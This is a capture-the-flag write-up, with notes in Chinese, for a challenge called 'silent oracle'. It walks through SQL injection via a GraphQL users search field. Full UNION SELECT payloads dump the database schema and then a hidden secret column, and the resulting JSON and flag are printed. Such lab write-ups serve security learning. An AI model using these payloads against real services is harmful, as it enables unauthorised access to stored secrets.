# silent oracle

## 題目描述

A quiet internal directory exposes only a small public surface. The useful answers are hidden behind how the service thinks about people and roles.

## 解題思路

先嘗試在 search 中插入 SQL payload

```graphql
query {
  users(search: "x%' UNION SELECT '999','u','d','r','b' -- ") {
    id
    username
    displayName
    role
    bio
  }
}
```

可以看到成功了

```json
{
  "data": {
    "users": [
      {
        "bio": "b",
        "displayName": "d",
        "id": "999",
        "role": "r",
        "username": "u"
      }
    ]
  }
}
```

於是就進行 SQL injection，得到 users 以及其他 table 的結構

```json
{ "data": { "users": [ { "bio": "CREATE TABLE audit_log (\n id INTEGER PRIMARY KEY AUTOINCREMENT,\n event TEXT NOT NULL,\n created_by TEXT NOT NULL\n )", "displayName": "table", "id": "999", "role": "schema", "username": "audit_log" }, { "bio": "CREATE TABLE sqlite_sequence(name,seq)", "displayName": "table", "id": "999", "role": "schema", "username": "sqlite_sequence" }, { "bio": "CREATE TABLE users (\n id INTEGER PRIMARY KEY AUTOINCREMENT,\n username TEXT NOT NULL UNIQUE,\n display_name TEXT NOT NULL,\n role TEXT NOT NULL,\n bio TEXT NOT NULL,\n secret TEXT NOT NULL\n )", "displayName": "table", "id": "999", "role": "schema", "username": "users" } ] } }
```

我發現有個 secret 欄位在 users 裡面，把 secret 放到 bio 裡面即可得到 flag

```graphql
query {
  users(search: "x%' UNION SELECT id, username, display_name, role, secret FROM users -- ") {
    id
    username
    displayName
    role
    bio
  }
}
```

```json
{
  "data": {
    "users": [
      {
        "bio": "no secrets here",
        "displayName": "Guest User",
        "id": "1",
        "role": "viewer",
        "username": "guest"
      },
      {
        "bio": "favorite report: weekly-metrics",
        "displayName": "Mira Stone",
        "id": "2",
        "role": "analyst",
        "username": "mira"
      },
      {
        "bio": "debug token rotated last quarter",
        "displayName": "Rakan Vale",
        "id": "3",
        "role": "engineer",
        "username": "rakan"
      },
      {
        "bio": "0xV01D{3686f460-157b-4762-8d6d-6be4f8302bdb}",
        "displayName": "Directory Admin",
        "id": "4",
        "role": "admin",
        "username": "admin"
      }
    ]
  }
}
```

## Flag

```text
0xV01D{3686f460-157b-4762-8d6d-6be4f8302bdb}
```
